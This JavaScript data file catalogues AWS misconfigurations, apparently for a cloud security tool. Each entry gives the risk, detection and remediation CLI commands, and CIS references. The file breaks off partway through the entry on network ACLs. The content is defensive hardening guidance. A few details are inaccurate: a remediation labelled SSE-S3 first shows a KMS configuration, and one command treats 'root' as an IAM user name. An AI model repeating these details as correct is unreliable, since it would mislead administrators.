// ============================================================================
// Cloud Misconfigurations Database
// Accurate cloud security content for AWS, Azure, and GCP
// ============================================================================

const AWS_MISCONFIGS = [
  {
    id: 'AWS-001',
    service: 'S3',
    misconfiguration: 'Public bucket ACL allows unauthenticated read access',
    risk: 'Critical',
    impact: 'Any unauthenticated user on the internet can list and download all objects in the bucket. This frequently leads to exposure of sensitive data including PII, credentials, source code, database backups, and internal documents. Publicly exposed S3 buckets have been responsible for some of the largest cloud data breaches on record.',
    detection: 'aws s3api get-bucket-acl --bucket <bucket-name> | grep -E "AllUsers|AuthenticatedUsers"\naws s3api get-public-access-block --bucket <bucket-name>\naws s3api get-bucket-policy-status --bucket <bucket-name>',
    remediation: 'Apply the S3 Block Public Access settings at the account level:\n  aws s3control put-public-access-block --account-id <account-id> --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\nFor individual buckets:\n  aws s3api put-public-access-block --bucket <bucket-name> --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true\nRemove any public ACL grants:\n  aws s3api put-bucket-acl --bucket <bucket-name> --acl private\nConsole: S3 > Bucket > Permissions > Block public access > Edit > Enable all four settings.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.1.4'
  },
  {
    id: 'AWS-002',
    service: 'S3',
    misconfiguration: 'Default server-side encryption not enabled on bucket',
    risk: 'High',
    impact: 'Objects stored without encryption are readable in plaintext if the underlying storage medium is compromised or if access controls are bypassed. This violates most compliance frameworks that mandate encryption at rest for sensitive data.',
    detection: 'aws s3api get-bucket-encryption --bucket <bucket-name>\nIf the command returns "ServerSideEncryptionConfigurationNotFoundError", encryption is not configured.',
    remediation: 'Enable default SSE-S3 encryption:\n  aws s3api put-bucket-encryption --bucket <bucket-name> --server-side-encryption-configuration \'{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"aws:kms","KMSMasterKeyID":"<kms-key-arn>"},"BucketKeyEnabled":true}]}\'\nFor SSE-S3 (free, no KMS costs):\n  aws s3api put-bucket-encryption --bucket <bucket-name> --server-side-encryption-configuration \'{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}\'\nConsole: S3 > Bucket > Properties > Default encryption > Edit > Enable SSE-S3 or SSE-KMS.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.1.1'
  },
  {
    id: 'AWS-003',
    service: 'S3',
    misconfiguration: 'Bucket versioning not enabled',
    risk: 'Medium',
    impact: 'Without versioning, deleted or overwritten objects cannot be recovered. Ransomware attacks can permanently destroy data by overwriting objects. Accidental deletions have no recovery path. Version history needed for audit trails is unavailable.',
    detection: 'aws s3api get-bucket-versioning --bucket <bucket-name>\nIf Status is not "Enabled", versioning is off.',
    remediation: 'Enable versioning:\n  aws s3api put-bucket-versioning --bucket <bucket-name> --versioning-configuration Status=Enabled\nNote: Versioning cannot be disabled once enabled, only suspended. Configure lifecycle rules to manage version costs:\n  aws s3api put-bucket-lifecycle-configuration --bucket <bucket-name> --lifecycle-configuration \'{"Rules":[{"ID":"ExpireOldVersions","Status":"Enabled","NoncurrentVersionExpiration":{"NoncurrentDays":90},"Filter":{"Prefix":""}}]}\'\nConsole: S3 > Bucket > Properties > Bucket Versioning > Edit > Enable.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.1.3'
  },
  {
    id: 'AWS-004',
    service: 'S3',
    misconfiguration: 'Server access logging not enabled on bucket',
    risk: 'Medium',
    impact: 'Without access logs, there is no record of who accessed which objects and when. Forensic investigation of data breaches is significantly hampered. Compliance requirements for access audit trails cannot be met. Anomalous access patterns cannot be detected.',
    detection: 'aws s3api get-bucket-logging --bucket <bucket-name>\nIf the response has no LoggingEnabled key, logging is disabled.',
    remediation: 'Create a logging target bucket (or use existing), then enable logging:\n  aws s3api put-bucket-logging --bucket <bucket-name> --bucket-logging-status \'{"LoggingEnabled":{"TargetBucket":"<logging-bucket>","TargetPrefix":"s3-access-logs/<bucket-name>/"}}\'\nEnsure the logging target bucket has appropriate ACLs:\n  aws s3api put-bucket-acl --bucket <logging-bucket> --grant-write URI=http://acs.amazonaws.com/groups/s3/LogDelivery --grant-read-acp URI=http://acs.amazonaws.com/groups/s3/LogDelivery\nConsole: S3 > Bucket > Properties > Server access logging > Edit > Enable.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.1.2'
  },
  {
    id: 'AWS-005',
    service: 'S3',
    misconfiguration: 'MFA Delete not enabled on versioned buckets',
    risk: 'Medium',
    impact: 'Without MFA Delete, any IAM user or role with s3:DeleteObject permissions can permanently delete object versions. An attacker who compromises IAM credentials can wipe all versions of critical data, bypassing the protection that versioning provides.',
    detection: 'aws s3api get-bucket-versioning --bucket <bucket-name>\nCheck that MFADelete is "Enabled" in the response.',
    remediation: 'MFA Delete must be enabled by the root account using the root credentials:\n  aws s3api put-bucket-versioning --bucket <bucket-name> --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa "arn:aws:iam::<account-id>:mfa/<mfa-device> <mfa-code>"\nNote: This requires the root account MFA device serial and a current token code. Cannot be done via console; CLI with root credentials is required.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.1.3'
  },
  {
    id: 'AWS-006',
    service: 'IAM',
    misconfiguration: 'IAM policy with wildcard (*) permissions on actions and resources',
    risk: 'Critical',
    impact: 'Policies granting Action: "*" and Resource: "*" effectively give administrator access to the entire AWS account. If the associated principal is compromised, the attacker has full control over all services and data. This violates the principle of least privilege and most compliance requirements.',
    detection: 'aws iam list-policies --scope Local --query "Policies[*].Arn" --output text | while read arn; do\n  version=$(aws iam get-policy --policy-arn "$arn" --query "Policy.DefaultVersionId" --output text)\n  aws iam get-policy-version --policy-arn "$arn" --version-id "$version" --query "PolicyVersion.Document"\ndone | grep -B5 -A5 \'"*"\'',
    remediation: 'Replace wildcard policies with least-privilege policies scoped to specific actions and resources:\n  1. Use IAM Access Analyzer to generate policies based on actual usage:\n     aws accessanalyzer start-policy-generation --policy-generation-details \'{"principalArn":"<role-arn>"}\'\n  2. Review and attach the generated policy, removing the wildcard policy:\n     aws iam detach-user-policy --user-name <user> --policy-arn <wildcard-policy-arn>\n     aws iam attach-user-policy --user-name <user> --policy-arn <scoped-policy-arn>\n  3. Use AWS managed policies where possible instead of custom wildcard policies.\nConsole: IAM > Policies > Select policy > Edit > Replace wildcards with specific actions.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.16'
  },
  {
    id: 'AWS-007',
    service: 'IAM',
    misconfiguration: 'MFA not enabled for IAM users with console access',
    risk: 'Critical',
    impact: 'Without MFA, a compromised password is sufficient for full account access. Phishing attacks, credential stuffing, and password reuse can all lead to account takeover. Attackers gain the same privileges as the legitimate user.',
    detection: 'aws iam generate-credential-report\naws iam get-credential-report --output text --query Content | base64 -d | cut -d, -f1,4,8 | grep -v "true$"\nThis lists users with console access (password_enabled=true) but no MFA (mfa_active=false).',
    remediation: 'For each user without MFA:\n  1. Create a virtual MFA device:\n     aws iam create-virtual-mfa-device --virtual-mfa-device-name <user>-mfa --outfile /tmp/qr.png --bootstrap-method QRCodePNG\n  2. Enable MFA for the user (requires two consecutive codes):\n     aws iam enable-mfa-device --user-name <user> --serial-number arn:aws:iam::<account-id>:mfa/<user>-mfa --authentication-code1 <code1> --authentication-code2 <code2>\n  3. Enforce MFA via IAM policy by attaching a deny-all-without-MFA policy:\n     Attach a policy with Condition: {"BoolIfExists":{"aws:MultiFactorAuthPresent":"false"}} on deny statements.\nConsole: IAM > Users > User > Security credentials > Assign MFA device.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.10'
  },
  {
    id: 'AWS-008',
    service: 'IAM',
    misconfiguration: 'Access keys older than 90 days not rotated',
    risk: 'High',
    impact: 'Long-lived access keys increase the window of opportunity for compromise. Keys may be leaked through code repositories, logs, error messages, or developer workstations. The longer a key exists, the more likely it has been exposed and the harder it is to track all locations where it is stored.',
    detection: 'aws iam generate-credential-report\naws iam get-credential-report --output text --query Content | base64 -d | awk -F, \'NR>1 {if ($9 == "true") print $1, $10}\'\nThis shows users with active access keys and their creation dates. Also:\n  aws iam list-access-keys --user-name <user> --query "AccessKeyMetadata[?CreateDate<=\'$(date -d \"-90 days\" +%Y-%m-%d)\'].{KeyId:AccessKeyId,Created:CreateDate}"',
    remediation: 'Rotate keys for each affected user:\n  1. Create new access key:\n     aws iam create-access-key --user-name <user>\n  2. Update all applications using the old key with the new credentials.\n  3. Deactivate the old key:\n     aws iam update-access-key --user-name <user> --access-key-id <old-key-id> --status Inactive\n  4. After confirming no impact, delete the old key:\n     aws iam delete-access-key --user-name <user> --access-key-id <old-key-id>\n  5. Set up a Config rule to alert on key age:\n     Use AWS Config managed rule "access-keys-rotated" with maxAccessKeyAge=90.\nConsole: IAM > Users > User > Security credentials > Access keys > Create/Deactivate.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.14'
  },
  {
    id: 'AWS-009',
    service: 'IAM',
    misconfiguration: 'IAM roles with overly broad trust policies',
    risk: 'High',
    impact: 'Roles with trust policies that allow assumption by overly broad principals (e.g., Principal: "*" or Principal: {"AWS": "*"}) can be assumed by any AWS account. Attackers from any account can obtain temporary credentials for the role, accessing all resources the role permits.',
    detection: 'for role in $(aws iam list-roles --query "Roles[*].RoleName" --output text); do\n  trust=$(aws iam get-role --role-name "$role" --query "Role.AssumeRolePolicyDocument" --output json)\n  echo "$trust" | grep -q \'"\\*"\' && echo "OVERLY BROAD: $role"\ndone',
    remediation: 'Restrict trust policies to specific account IDs and services:\n  aws iam update-assume-role-policy --role-name <role> --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<trusted-account-id>:root"},"Action":"sts:AssumeRole","Condition":{"StringEquals":{"sts:ExternalId":"<external-id>"}}}]}\'\nAlways use ExternalId conditions for cross-account roles to prevent confused deputy attacks.\nConsole: IAM > Roles > Role > Trust relationships > Edit trust policy.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.16'
  },
  {
    id: 'AWS-010',
    service: 'IAM',
    misconfiguration: 'Root account used for day-to-day operations',
    risk: 'Critical',
    impact: 'The root account has unrestricted access to all resources and cannot be limited by IAM policies. Root account compromise means total loss of the AWS account. Root credentials cannot be scoped, audited per-service, or restricted by SCPs in AWS Organizations.',
    detection: 'aws iam generate-credential-report\naws iam get-credential-report --output text --query Content | base64 -d | head -2\nCheck the root account row: password_last_used and access_key_1_last_used_date should not be recent. Also:\n  aws iam get-account-summary --query "SummaryMap.AccountAccessKeysPresent"\nIf this returns 1, root has active access keys.',
    remediation: 'Remove root access keys:\n  aws iam delete-access-key --user-name root --access-key-id <key-id>\nEnable MFA on root:\n  Console: My Security Credentials > MFA > Activate MFA\nCreate IAM admin user for daily operations:\n  aws iam create-user --user-name admin\n  aws iam attach-user-policy --user-name admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n  aws iam create-login-profile --user-name admin --password <password> --password-reset-required\nStore root credentials securely offline. Only use root for tasks that require it (billing, account-level changes).',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.7'
  },
  {
    id: 'AWS-011',
    service: 'IAM',
    misconfiguration: 'No IAM password policy or weak password policy configured',
    risk: 'High',
    impact: 'Without a strong password policy, IAM users may set weak or easily guessable passwords. Brute force and credential stuffing attacks become viable. Compliance requirements for password complexity, length, and rotation cannot be enforced.',
    detection: 'aws iam get-account-password-policy\nIf the command returns "NoSuchEntity", no password policy is configured. Check individual settings:\n  MinimumPasswordLength should be >= 14\n  RequireSymbols, RequireNumbers, RequireUppercaseCharacters, RequireLowercaseCharacters should all be true\n  MaxPasswordAge should be <= 90\n  PasswordReusePrevention should be >= 24',
    remediation: 'Set a strong password policy:\n  aws iam update-account-password-policy --minimum-password-length 14 --require-symbols --require-numbers --require-uppercase-characters --require-lowercase-characters --max-password-age 90 --password-reuse-prevention 24 --allow-users-to-change-password\nConsole: IAM > Account settings > Password policy > Edit > Configure all requirements.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.8, 1.9'
  },
  {
    id: 'AWS-012',
    service: 'EC2',
    misconfiguration: 'Security group allows unrestricted SSH access (0.0.0.0/0 on port 22)',
    risk: 'Critical',
    impact: 'Exposing SSH to the entire internet invites brute force attacks, exploitation of SSH vulnerabilities, and unauthorized access attempts. Automated scanners continuously probe port 22 across all public IP ranges. A successful compromise gives shell access to the instance and potentially lateral movement into the VPC.',
    detection: 'aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.to-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0" --query "SecurityGroups[*].{ID:GroupId,Name:GroupName}"',
    remediation: 'Restrict SSH access to known IP ranges:\n  aws ec2 revoke-security-group-ingress --group-id <sg-id> --protocol tcp --port 22 --cidr 0.0.0.0/0\n  aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 22 --cidr <office-ip>/32\nBetter: Use AWS Systems Manager Session Manager for shell access without opening any inbound ports:\n  aws ssm start-session --target <instance-id>\nConsole: EC2 > Security Groups > Select SG > Inbound rules > Edit > Remove 0.0.0.0/0 on port 22.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 5.2'
  },
  {
    id: 'AWS-013',
    service: 'EC2',
    misconfiguration: 'Security group allows unrestricted RDP access (0.0.0.0/0 on port 3389)',
    risk: 'Critical',
    impact: 'Publicly exposed RDP is one of the most common initial access vectors for ransomware. BlueKeep and related RDP vulnerabilities have been widely exploited. Brute force attacks against RDP are constant and automated.',
    detection: 'aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=3389" "Name=ip-permission.to-port,Values=3389" "Name=ip-permission.cidr,Values=0.0.0.0/0" --query "SecurityGroups[*].{ID:GroupId,Name:GroupName}"',
    remediation: 'Restrict RDP access:\n  aws ec2 revoke-security-group-ingress --group-id <sg-id> --protocol tcp --port 3389 --cidr 0.0.0.0/0\n  aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 3389 --cidr <vpn-ip>/32\nPrefer AWS Systems Manager Fleet Manager for remote desktop instead of exposing RDP directly.\nConsole: EC2 > Security Groups > Select SG > Inbound rules > Edit > Remove 0.0.0.0/0 on port 3389.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 5.3'
  },
  {
    id: 'AWS-014',
    service: 'EC2',
    misconfiguration: 'EBS volumes not encrypted at rest',
    risk: 'High',
    impact: 'Unencrypted EBS volumes store data in plaintext on the underlying storage hardware. Snapshots created from unencrypted volumes are also unencrypted and may be shared or copied to other accounts. Compliance frameworks (HIPAA, PCI-DSS, SOC 2) require encryption at rest.',
    detection: 'aws ec2 describe-volumes --query "Volumes[?Encrypted==`false`].{VolumeId:VolumeId,Size:Size,State:State,AZ:AvailabilityZone}" --output table\nCheck account-level default:\n  aws ec2 get-ebs-encryption-by-default',
    remediation: 'Enable EBS encryption by default for all new volumes:\n  aws ec2 enable-ebs-encryption-by-default\nFor existing unencrypted volumes, create an encrypted copy:\n  1. Create snapshot: aws ec2 create-snapshot --volume-id <vol-id> --description "pre-encryption"\n  2. Copy with encryption: aws ec2 copy-snapshot --source-snapshot-id <snap-id> --source-region <region> --encrypted --kms-key-id <key-arn>\n  3. Create new volume from encrypted snapshot: aws ec2 create-volume --snapshot-id <encrypted-snap-id> --availability-zone <az> --encrypted\n  4. Stop instance, detach old volume, attach new encrypted volume, start instance.\nConsole: EC2 > EBS > Volumes > Check Encrypted column.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.2.1'
  },
  {
    id: 'AWS-015',
    service: 'EC2',
    misconfiguration: 'Instance Metadata Service v1 (IMDSv1) enabled',
    risk: 'High',
    impact: 'IMDSv1 uses a simple GET request to http://169.254.169.254 with no authentication. Any SSRF vulnerability in an application running on the instance can be exploited to steal IAM role credentials from the metadata service. This is the most common cloud-specific attack vector, responsible for numerous high-profile breaches including the 2019 Capital One breach.',
    detection: 'aws ec2 describe-instances --query "Reservations[*].Instances[*].{ID:InstanceId,IMDS:MetadataOptions.HttpTokens}" --output table\nInstances where HttpTokens is "optional" still allow IMDSv1.',
    remediation: 'Require IMDSv2 (token-based) on all instances:\n  aws ec2 modify-instance-metadata-options --instance-id <instance-id> --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1\nFor new instances, set IMDSv2 as default in launch templates:\n  aws ec2 create-launch-template --launch-template-name secure-template --launch-template-data \'{"MetadataOptions":{"HttpTokens":"required","HttpEndpoint":"enabled","HttpPutResponseHopLimit":1}}\'\nSet the account-level default:\n  aws ec2 modify-instance-metadata-defaults --http-tokens required\nConsole: EC2 > Instances > Select > Actions > Instance settings > Modify instance metadata options > IMDSv2 required.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 5.6'
  },
  {
    id: 'AWS-016',
    service: 'EC2',
    misconfiguration: 'AMIs shared publicly',
    risk: 'High',
    impact: 'Publicly shared AMIs may contain embedded credentials, API keys, SSH keys, database passwords, or proprietary application code. Anyone with an AWS account can launch instances from public AMIs and extract this sensitive information.',
    detection: 'aws ec2 describe-images --owners self --query "Images[*].{ID:ImageId,Name:Name,Public:Public}" --output table | grep True',
    remediation: 'Make AMIs private:\n  aws ec2 modify-image-attribute --image-id <ami-id> --launch-permission \'{"Remove":[{"Group":"all"}]}\'\nTo share with specific accounts instead of publicly:\n  aws ec2 modify-image-attribute --image-id <ami-id> --launch-permission \'{"Add":[{"UserId":"<account-id>"}]}\'\nConsole: EC2 > AMIs > Select AMI > Actions > Edit AMI permissions > Remove Public.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.2'
  },
  {
    id: 'AWS-017',
    service: 'RDS',
    misconfiguration: 'RDS instance publicly accessible',
    risk: 'Critical',
    impact: 'A publicly accessible RDS instance has a public IP and DNS endpoint reachable from the internet. Combined with weak credentials or SQL injection, this gives attackers direct access to database contents. Even with strong authentication, public exposure increases attack surface and enables enumeration.',
    detection: 'aws rds describe-db-instances --query "DBInstances[?PubliclyAccessible==`true`].{ID:DBInstanceIdentifier,Engine:Engine,Endpoint:Endpoint.Address}" --output table',
    remediation: 'Disable public access:\n  aws rds modify-db-instance --db-instance-identifier <instance-id> --no-publicly-accessible --apply-immediately\nEnsure the instance is in a private subnet:\n  aws rds modify-db-instance --db-instance-identifier <instance-id> --db-subnet-group-name <private-subnet-group>\nUse VPC security groups to restrict access to application servers only.\nConsole: RDS > Databases > Select DB > Modify > Connectivity > Public access: No.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.3.2'
  },
  {
    id: 'AWS-018',
    service: 'RDS',
    misconfiguration: 'RDS encryption at rest not enabled',
    risk: 'High',
    impact: 'Unencrypted RDS instances store data in plaintext on underlying storage. Snapshots are also unencrypted and could expose data if shared. Compliance with HIPAA, PCI-DSS, and other frameworks requires encryption at rest for databases containing sensitive data.',
    detection: 'aws rds describe-db-instances --query "DBInstances[?StorageEncrypted==`false`].{ID:DBInstanceIdentifier,Engine:Engine,Class:DBInstanceClass}" --output table',
    remediation: 'Encryption cannot be enabled on an existing unencrypted instance. Migration required:\n  1. Create encrypted snapshot: aws rds create-db-snapshot --db-instance-identifier <instance-id> --db-snapshot-identifier <snap-id>\n  2. Copy snapshot with encryption: aws rds copy-db-snapshot --source-db-snapshot-identifier <snap-id> --target-db-snapshot-identifier <encrypted-snap-id> --kms-key-id <kms-key-arn>\n  3. Restore from encrypted snapshot: aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <new-instance-id> --db-snapshot-identifier <encrypted-snap-id>\n  4. Update application connection strings to point to the new instance.\n  5. Delete old unencrypted instance after validation.\nConsole: RDS > Snapshots > Copy snapshot > Enable encryption.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.3.1'
  },
  {
    id: 'AWS-019',
    service: 'RDS',
    misconfiguration: 'RDS instance using default or weak master password',
    risk: 'Critical',
    impact: 'Default or weak master passwords can be brute-forced or guessed. If the RDS instance is publicly accessible (or reachable via a compromised application), attackers can gain full database access. Master user has complete control over all databases, tables, and data within the instance.',
    detection: 'Manual review required. Check if master username is common defaults like "admin", "root", "postgres", "master":\n  aws rds describe-db-instances --query "DBInstances[*].{ID:DBInstanceIdentifier,MasterUser:MasterUsername}" --output table\nAttempt to check for password policy compliance in your organization.',
    remediation: 'Rotate the master password to a strong, randomly generated value:\n  aws rds modify-db-instance --db-instance-identifier <instance-id> --master-user-password <new-strong-password> --apply-immediately\nBetter: Use AWS Secrets Manager for automatic rotation:\n  aws secretsmanager rotate-secret --secret-id <secret-arn>\nSet up automatic rotation with a Lambda function:\n  aws secretsmanager create-secret --name rds/<instance-id>/master --secret-string \'{"username":"admin","password":"<password>","engine":"mysql","host":"<endpoint>","port":3306}\'\n  aws secretsmanager rotate-secret --secret-id rds/<instance-id>/master --rotation-lambda-arn <lambda-arn> --rotation-rules AutomaticallyAfterDays=30',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.3'
  },
  {
    id: 'AWS-020',
    service: 'RDS',
    misconfiguration: 'Automated backups not enabled or retention period too short',
    risk: 'Medium',
    impact: 'Without automated backups or with an insufficient retention period, data recovery after accidental deletion, corruption, or ransomware is impossible or limited. Point-in-time recovery is unavailable. Disaster recovery plans are undermined.',
    detection: 'aws rds describe-db-instances --query "DBInstances[*].{ID:DBInstanceIdentifier,BackupRetention:BackupRetentionPeriod,LatestRestore:LatestRestorableTime}" --output table\nInstances with BackupRetentionPeriod of 0 have backups disabled.',
    remediation: 'Enable automated backups with sufficient retention:\n  aws rds modify-db-instance --db-instance-identifier <instance-id> --backup-retention-period 30 --preferred-backup-window "03:00-04:00" --apply-immediately\nMinimum recommended retention: 7 days. Production databases: 30+ days.\nConsole: RDS > Databases > Select DB > Modify > Backup > Backup retention period.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 2.3'
  },
  {
    id: 'AWS-021',
    service: 'Lambda',
    misconfiguration: 'Lambda function execution role has administrator access',
    risk: 'Critical',
    impact: 'A Lambda function with AdministratorAccess can perform any action on any resource in the AWS account. If the function has a code injection vulnerability, processes untrusted input, or imports a compromised dependency, the attacker gains full account control. Lambda functions often process external input making this especially dangerous.',
    detection: 'for func in $(aws lambda list-functions --query "Functions[*].FunctionName" --output text); do\n  role=$(aws lambda get-function-configuration --function-name "$func" --query "Role" --output text)\n  role_name=$(echo "$role" | awk -F/ \'{print $NF}\')\n  policies=$(aws iam list-attached-role-policies --role-name "$role_name" --query "AttachedPolicies[*].PolicyArn" --output text)\n  echo "$policies" | grep -q "AdministratorAccess" && echo "OVERPRIVILEGED: $func ($role_name)"\ndone',
    remediation: 'Create a least-privilege execution role:\n  1. Identify what the function actually needs (CloudWatch Logs, S3 read, DynamoDB write, etc.).\n  2. Create a scoped policy:\n     aws iam create-policy --policy-name lambda-<func>-policy --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["logs:CreateLogGroup","logs:CreateLogStream","logs:PutLogEvents"],"Resource":"arn:aws:logs:*:*:*"},{"Effect":"Allow","Action":["s3:GetObject"],"Resource":"arn:aws:s3:::<bucket>/*"}]}\'\n  3. Remove AdministratorAccess and attach the scoped policy:\n     aws iam detach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n     aws iam attach-role-policy --role-name <role> --policy-arn <scoped-policy-arn>',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 1.16'
  },
  {
    id: 'AWS-022',
    service: 'Lambda',
    misconfiguration: 'Lambda function not configured to run in a VPC',
    risk: 'Medium',
    impact: 'Lambda functions outside a VPC cannot access VPC resources directly and lack network-level isolation. They use public AWS networking and cannot benefit from security groups, NACLs, or VPC flow logs for traffic monitoring. Functions that need to access private resources (RDS, ElastiCache, internal APIs) in a VPC should be VPC-attached.',
    detection: 'aws lambda list-functions --query "Functions[?VpcConfig.VpcId==null || VpcConfig.VpcId==\\'\\'].{Name:FunctionName,Runtime:Runtime}" --output table',
    remediation: 'Configure VPC access for the function:\n  aws lambda update-function-configuration --function-name <func> --vpc-config SubnetIds=<subnet-1>,<subnet-2>,SecurityGroupIds=<sg-id>\nEnsure the execution role has the required VPC permissions:\n  aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaVPCAccessExecutionRole\nNote: VPC-attached Lambda functions need a NAT Gateway to access the internet. Place them in private subnets.\nConsole: Lambda > Function > Configuration > VPC > Edit.',
    compliance: 'AWS Well-Architected Framework - Security Pillar - SEC05-BP03'
  },
  {
    id: 'AWS-023',
    service: 'CloudTrail',
    misconfiguration: 'CloudTrail logging disabled or not configured',
    risk: 'Critical',
    impact: 'Without CloudTrail, there is no record of API activity in the AWS account. Security incidents cannot be investigated. Unauthorized changes go undetected. Compliance audits cannot be completed. This is equivalent to operating blind from a security monitoring perspective.',
    detection: 'aws cloudtrail describe-trails --query "trailList[*].{Name:Name,IsMultiRegion:IsMultiRegionTrail,IsLogging:HasCustomEventSelectors,Bucket:S3BucketName}"\naws cloudtrail get-trail-status --name <trail-name> --query "{IsLogging:IsLogging,LatestDelivery:LatestDeliveryTime}"',
    remediation: 'Create a multi-region trail:\n  aws cloudtrail create-trail --name organization-trail --s3-bucket-name <logging-bucket> --is-multi-region-trail --enable-log-file-validation --include-global-service-events --kms-key-id <kms-key-arn>\n  aws cloudtrail start-logging --name organization-trail\nEnable data events for S3 and Lambda:\n  aws cloudtrail put-event-selectors --trail-name organization-trail --event-selectors \'[{"ReadWriteType":"All","IncludeManagementEvents":true,"DataResources":[{"Type":"AWS::S3::Object","Values":["arn:aws:s3"]},{"Type":"AWS::Lambda::Function","Values":["arn:aws:lambda"]}]}]\'\nConsole: CloudTrail > Trails > Create trail.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.1'
  },
  {
    id: 'AWS-024',
    service: 'CloudTrail',
    misconfiguration: 'CloudTrail log file validation not enabled',
    risk: 'High',
    impact: 'Without log file validation, attackers who gain access to the logging bucket can modify or delete CloudTrail logs to cover their tracks. There is no cryptographic assurance that logs have not been tampered with. Forensic integrity of audit logs is compromised.',
    detection: 'aws cloudtrail describe-trails --query "trailList[?LogFileValidationEnabled==`false`].{Name:Name,Bucket:S3BucketName}"',
    remediation: 'Enable log file validation on all trails:\n  aws cloudtrail update-trail --name <trail-name> --enable-log-file-validation\nValidate existing digest files:\n  aws cloudtrail validate-logs --trail-arn <trail-arn> --start-time <start> --end-time <end>\nConsole: CloudTrail > Trails > Select trail > Edit > Log file validation > Enabled.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.2'
  },
  {
    id: 'AWS-025',
    service: 'CloudTrail',
    misconfiguration: 'No multi-region CloudTrail trail configured',
    risk: 'High',
    impact: 'A single-region trail only captures API activity in that region. Attackers can operate in other regions undetected, creating resources, exfiltrating data, or establishing persistence. Global services (IAM, STS, CloudFront) events may also be missed.',
    detection: 'aws cloudtrail describe-trails --query "trailList[?IsMultiRegionTrail==`false`].{Name:Name,HomeRegion:HomeRegion}"',
    remediation: 'Convert existing trail to multi-region:\n  aws cloudtrail update-trail --name <trail-name> --is-multi-region-trail\nOr create a new multi-region trail:\n  aws cloudtrail create-trail --name global-trail --s3-bucket-name <bucket> --is-multi-region-trail --include-global-service-events --enable-log-file-validation\n  aws cloudtrail start-logging --name global-trail\nConsole: CloudTrail > Trails > Select trail > Edit > General details > Multi-region: Yes.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.1'
  },
  {
    id: 'AWS-026',
    service: 'VPC',
    misconfiguration: 'VPC Flow Logs not enabled',
    risk: 'High',
    impact: 'Without flow logs, network traffic patterns cannot be monitored or analyzed. Suspicious connections, data exfiltration, lateral movement, and communication with known malicious IPs go undetected. Incident response and forensic investigation of network-level events is severely limited.',
    detection: 'for vpc in $(aws ec2 describe-vpcs --query "Vpcs[*].VpcId" --output text); do\n  flows=$(aws ec2 describe-flow-logs --filter "Name=resource-id,Values=$vpc" --query "FlowLogs[*].FlowLogId" --output text)\n  [ -z "$flows" ] && echo "NO FLOW LOGS: $vpc"\ndone',
    remediation: 'Enable VPC Flow Logs to CloudWatch Logs:\n  aws ec2 create-flow-logs --resource-type VPC --resource-ids <vpc-id> --traffic-type ALL --log-destination-type cloud-watch-logs --log-group-name vpc-flow-logs --deliver-logs-permission-arn <flow-logs-role-arn> --max-aggregation-interval 60\nOr to S3 for cost-effective long-term storage:\n  aws ec2 create-flow-logs --resource-type VPC --resource-ids <vpc-id> --traffic-type ALL --log-destination-type s3 --log-destination arn:aws:s3:::<bucket>/flow-logs/\nConsole: VPC > Your VPCs > Select VPC > Flow logs > Create flow log.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.9'
  },
  {
    id: 'AWS-027',
    service: 'VPC',
    misconfiguration: 'Network ACLs allow all inbound and outbound traffic',
    risk: 'Medium',
    impact: 'Default NACLs that allow all traffic provide no network-level filtering. NACLs serve as a secondary defense layer behind security groups. Without restrictive NACLs, a misconfigured security group is the only barrier, removing defense in depth.',
    detection: 'aws ec2 describe-network-acls --query "NetworkAcls[*].{ID:NetworkAclId,VPC:VpcId,Inbound:Entries[?RuleAction==\'allow\' && CidrBlock==\'0.0.0.0/0\' && Egress==`false`],Outbound:Entries[?RuleAction==\'allow\' && CidrBlock==\'0.0.0.0/0\' && Egress==`true`]}"',
